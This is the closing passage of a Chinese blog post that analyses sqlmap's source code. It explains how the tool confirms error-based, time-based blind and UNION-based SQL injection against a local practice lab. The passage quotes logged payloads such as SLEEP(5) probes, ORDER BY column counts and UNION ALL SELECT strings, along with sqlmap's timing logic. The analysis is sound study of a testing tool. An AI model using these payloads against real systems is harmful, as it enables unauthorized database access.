class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;font color= "#FFFF00"&gt;&lt;/font&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src="../images/Less-1.jpg" /&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>他会解析html出标签对应的内容 去重去掉空格<br>所以就得到两个页面的不同的内容地方也就是回显的地方  </p>
<p>这里有个问题就是说只要找到就直接跳出遍历了<br>这里就是那个 Your<br><img src="/2019/11/08/sqlmap源码浅析/%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E4%B8%B21.jpg" alt="注入字符串1"></p>
<p><img src="/2019/11/08/sqlmap源码浅析/%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E4%B8%B22.jpg" alt="注入字符串2">  </p>
<p><img src="/2019/11/08/sqlmap源码浅析/%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E4%B8%B23.jpg" alt="注入字符串3">  </p>
<h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p><img src="/2019/11/08/sqlmap源码浅析/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A51.jpg" alt="报错注入1">  </p>
<p>‘qjzkq(?P<result>.*?)qvxpq’<br>他这里的两端是这样的规则:<br> q(zqxjkvbp)q (result) q(zqxjkvbp)q<br> 中间随机三位 作为前后隔绝的  </result></p>
<p><img src="/2019/11/08/sqlmap源码浅析/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A52.jpg" alt="报错注入2">  </p>
<h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>时间是这样的先5s然后0再5来确认结果<br>这个5s是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">20</span>:<span class="number">48</span>:<span class="number">41</span>] [PAYLOAD] <span class="number">1</span><span class="string">' AND SLEEP(5) AND '</span>xXoJ<span class="string">'='</span>xXoJ</span><br><span class="line">[<span class="number">20</span>:<span class="number">48</span>:<span class="number">47</span>] [PAYLOAD] <span class="number">1</span><span class="string">' AND SLEEP(0) AND '</span>xXoJ<span class="string">'='</span>xXoJ</span><br><span class="line">[<span class="number">20</span>:<span class="number">48</span>:<span class="number">47</span>] [PAYLOAD] <span class="number">1</span><span class="string">' AND SLEEP(5) AND '</span>xXoJ<span class="string">'='</span>xXoJ</span><br><span class="line">[<span class="number">20</span>:<span class="number">48</span>:<span class="number">52</span>] [INFO] GET parameter <span class="string">'id'</span> appears to be <span class="string">'MySQL &gt;= 5.0.12 AND time-based blind'</span> injectable</span><br></pre></td></tr></table></figure>

<p>对于时间盲注的特点<br>他每次请求都是用的这个 并设置了时间盲注参数为True</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Request.queryPage(reqPayload, place, timeBasedCompare=<span class="literal">True</span>, raise404=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>这里有 timeBasedCompare 里面就有对时间进行判断  </p>
<p>这里对时间的判断我简单的跟了下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里先获取几次访问的响应时间 计算出标准差</span></span><br><span class="line">deviation = stdev(kb.responseTimes.get(kb.responseTimeMode, []))</span><br><span class="line">threadData = getCurrentThreadData()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> deviation <span class="keyword">and</span> <span class="keyword">not</span> conf.direct <span class="keyword">and</span> <span class="keyword">not</span> conf.disableStats:</span><br><span class="line">	<span class="comment"># 存储的请求的时间次数小于30则请求30次</span></span><br><span class="line">	<span class="keyword">if</span> len(kb.responseTimes[kb.responseTimeMode]) &lt; MIN_TIME_RESPONSES:</span><br><span class="line">		warnMsg = <span class="string">"time-based standard deviation method used on a model "</span></span><br><span class="line">		warnMsg += <span class="string">"with less than %d response times"</span> % MIN_TIME_RESPONSES</span><br><span class="line">		logger.warn(warnMsg)</span><br><span class="line">	<span class="comment"># TIME_STDEV_COEFF 延迟基数就是7 * 标准差 + 响应时间列表的算术平均值</span></span><br><span class="line">	lowerStdLimit = average(kb.responseTimes[kb.responseTimeMode]) + TIME_STDEV_COEFF * deviation</span><br><span class="line">	<span class="comment"># 最小有效延迟响应=0.5 与 上面算出来的正常的最小响应值 然后取最大与上一次的时间进行比较</span></span><br><span class="line">	retVal = (threadData.lastQueryDuration &gt;= max(MIN_VALID_DELAYED_RESPONSE, lowerStdLimit))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> kb.testMode <span class="keyword">and</span> retVal:</span><br><span class="line">		<span class="keyword">if</span> kb.adjustTimeDelay <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">			msg = <span class="string">"do you want sqlmap to try to optimize value(s) "</span></span><br><span class="line">			msg += <span class="string">"for DBMS delay responses (option '--time-sec')? [Y/n] "</span></span><br><span class="line"></span><br><span class="line">			kb.adjustTimeDelay = ADJUST_TIME_DELAY.DISABLE <span class="keyword">if</span> <span class="keyword">not</span> readInput(msg, default=<span class="string">'Y'</span>, boolean=<span class="literal">True</span>) <span class="keyword">else</span> ADJUST_TIME_DELAY.YES</span><br><span class="line">		<span class="keyword">if</span> kb.adjustTimeDelay <span class="keyword">is</span> ADJUST_TIME_DELAY.YES:</span><br><span class="line">			adjustTimeDelay(threadData.lastQueryDuration, lowerStdLimit)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> retVal</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	delta = threadData.lastQueryDuration - conf.timeSec</span><br><span class="line">	<span class="keyword">if</span> Backend.getIdentifiedDbms() <span class="keyword">in</span> (DBMS.MYSQL,):  <span class="comment"># MySQL's SLEEP(X) lasts 0.05 seconds shorter on average</span></span><br><span class="line">		delta += <span class="number">0.05</span></span><br><span class="line">	<span class="keyword">return</span> delta &gt;= <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>就是说 sqlmap对时间盲注的判断是只要 超过标准的延迟时间就认为是有延迟了而不是直接判断测试的延迟时间  </p>
<p><img src="/2019/11/08/sqlmap源码浅析/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A81.jpg" alt="时间盲注1">  </p>
<p>时间盲注成功 获取到响应的值大于 最大延迟值<br><img src="/2019/11/08/sqlmap源码浅析/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A82.jpg" alt="时间盲注2">  </p>
<p>如果命中则再测试下0延迟的时候是否是0<br>之后再请求一次5s的是否可以延迟 延迟则成功  </p>
<p>会有人问了这个5s是从哪里来的 为什么是5s<br>是默认的 5s<br>从 sqlmap.conf配置的并加载到  conf.timeSec 请求的时候把payload的 SLEEPTIME 替换为时间 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Seconds to delay the response from the DBMS.</span></span><br><span class="line"><span class="comment"># Valid: integer</span></span><br><span class="line"><span class="comment"># Default: 5</span></span><br><span class="line">timeSec = <span class="number">5</span></span><br></pre></td></tr></table></figure>

<h5 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h5><p>联合查询是 cahr: NULL columns 是 1-20  这里是测试加入列有1到20的</p>
<p>先是 <code>1&#39; ORDER BY 3-- mobs</code>  获取是三个字段  页面显示正常</p>
<p><code>1&#39; UNION ALL SELECT NULL,NULL,NULL-- NCHR</code>  </p>
<p>因为是有三个查询的位置<br>然后让前一个查询为空 让联合查询后面的顶替到前面的位置  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">17</span>:<span class="number">10</span>:<span class="number">09</span>] [PAYLOAD] <span class="number">1</span><span class="string">' UNION ALL SELECT NULL,CONCAT(0x716b6a6b71,0x68755345735665506377,0x71786a7871),NULL-- CYef</span></span><br><span class="line"><span class="string">[17:10:09] [PAYLOAD] -2325'</span> UNION ALL SELECT NULL,CONCAT(<span class="number">0x716b6a6b71</span>,<span class="number">0x58457874656f4c636a5a59684143424469464e445551577364744f6c43587179464b766151495079</span>,<span class="number">0x71786a7871</span>),NULL-- UhFT</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/08/sqlmap源码浅析/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5.jpg" alt="联合注入">  </p>
<p>最后会把这几种注入成功的都输出  </p>
<p><img src="/2019/11/08/sqlmap源码浅析/%E6%9C%80%E5%90%8E%E8%BE%93%E5%87%BA.jpg" alt="最后输出">  </p>
<p>要是pycharm 断点调试的话 最好设置下不使用缓存和输出级别高一些  </p>
<p><code>-u &quot;http://192.168.19.128:8089/Less-1/?id=1&quot; --flush-session -v 3</code>  </p>
<p>这里就是最简单的 -u的参数执行了什么  </p>
<p>重新梳理下流程  </p>
<p><img src="/2019/11/08/sqlmap源码浅析/sqlmap%E7%AE%80%E5%8D%95%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt="sqlmap简单流程图">  </p>
<p>这里在网上找了一个更详细的流程图 但是不能下载只能在线看<br><a href="https://www.processon.com/view/5835511ce4b0620292bd7285" target="_blank" rel="noopener">https://www.processon.com/view/5835511ce4b0620292bd7285</a></p>

      
    </div>

    

    
      
    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      
        
          
        
        <div class="post-tags">
          
            <a href="/tags/源码/" rel="tag"># 源码</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/10/15/redis实战速读书笔记-四/" rel="next" title="redis实战速读书笔记(四)">
                <i class="fa fa-chevron-left"></i> redis实战速读书笔记(四)
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/11/12/Gsil源码分析-github监控/" rel="prev" title="Gsil源码分析(github监控)">
                Gsil源码分析(github监控) <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>

  </div>


          </div>
          
  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-overview">

          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  
    <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Recar">
  
  <p class="site-author-name" itemprop="name">Recar</p>
  <div class="site-description motion-element" itemprop="description">年轻人就应该多读源码多读书</div>
</div>


  <nav class="site-state motion-element">
    
      <div class="site-state-item site-state-posts">
        
          <a href="/archives/">
        
          <span class="site-state-item-count">18</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
    

    

    
      
      
      <div class="site-state-item site-state-tags">
        
        
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">标签</span>
        
      </div>
    
  </nav>













          
          
        </div>
      </div>

      
      <!--noindex-->
        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQLMAP-源码简单分析"><span class="nav-number">1.</span> <span class="nav-text">SQLMAP 源码简单分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#简单的使用"><span class="nav-number">1.1.</span> <span class="nav-text">简单的使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#main"><span class="nav-number">1.1.1.</span> <span class="nav-text">main</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#初步准备"><span class="nav-number">1.1.2.</span> <span class="nav-text">初步准备</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#dirtyPatches"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">dirtyPatches</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#checkEnvironment"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">checkEnvironment</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#setPaths"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">setPaths</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#banner"><span class="nav-number">1.1.2.4.</span> <span class="nav-text">banner</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取命令行参数等数据"><span class="nav-number">1.1.2.5.</span> <span class="nav-text">获取命令行参数等数据</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他操作"><span class="nav-number">1.1.3.</span> <span class="nav-text">其他操作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#init-根据参数和命令行初始化一些配置相关的数据"><span class="nav-number">1.1.4.</span> <span class="nav-text">init 根据参数和命令行初始化一些配置相关的数据</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#init里一些有用的小技巧"><span class="nav-number">1.1.4.0.1.</span> <span class="nav-text">init里一些有用的小技巧</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlmap的测试框架"><span class="nav-number">1.1.4.1.</span> <span class="nav-text">sqlmap的测试框架</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#start-主要的函数"><span class="nav-number">1.1.5.</span> <span class="nav-text">start() 主要的函数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#initTargetEnv"><span class="nav-number">1.1.5.0.1.</span> <span class="nav-text">initTargetEnv()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#setupTargetEnv-设置一些目标测试相关的环境文件等"><span class="nav-number">1.1.5.0.2.</span> <span class="nav-text">setupTargetEnv  设置一些目标测试相关的环境文件等</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#checkWaf"><span class="nav-number">1.1.5.0.3.</span> <span class="nav-text">checkWaf</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#heuristicCheckSqlInjection-启发式注入"><span class="nav-number">1.1.5.0.4.</span> <span class="nav-text">heuristicCheckSqlInjection  启发式注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#checkSqlInjection"><span class="nav-number">1.1.5.0.5.</span> <span class="nav-text">checkSqlInjection</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#test"><span class="nav-number">1.1.5.0.6.</span> <span class="nav-text">test</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#boundary"><span class="nav-number">1.1.5.0.7.</span> <span class="nav-text">boundary</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#布尔盲注"><span class="nav-number">1.1.5.0.8.</span> <span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#报错注入"><span class="nav-number">1.1.5.0.9.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#时间盲注"><span class="nav-number">1.1.5.0.10.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#联合查询"><span class="nav-number">1.1.5.0.11.</span> <span class="nav-text">联合查询</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </div>
      <!--/noindex-->
      

      

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Recar</span>

  

  
</div>


  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.2.0</div>




        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    

    

    

  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>
















  
  









  
  <script src="/lib/jquery/index.js?v=3.4.1"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>




  <script src="/js/utils.js?v=7.2.0"></script>

  <script src="/js/motion.js?v=7.2.0"></script>



  
  


  <script src="/js/affix.js?v=7.2.0"></script>

  <script src="/js/schemes/pisces.js?v=7.2.0"></script>




  
  <script src="/js/scrollspy.js?v=7.2.0"></script>
<script src="/js/post-details.js?v=7.2.0"></script>



  <script src="/js/next-boot.js?v=7.2.0"></script>

  

  

  


  


























<script>
// GET RESPONSIVE HEIGHT PASSED FROM IFRAME

window.addEventListener("message", function(e) {
  var data = e.data;
  if ((typeof data === 'string') && (data.indexOf('ciu_embed') > -1)) {
    var featureID = data.split(':')[1];
    var height = data.split(':')[2];
    $(`iframe[data-feature=${featureID}]`).height(parseInt(height) + 30);
  }
}, false);
</script>








  

</body>
</html>
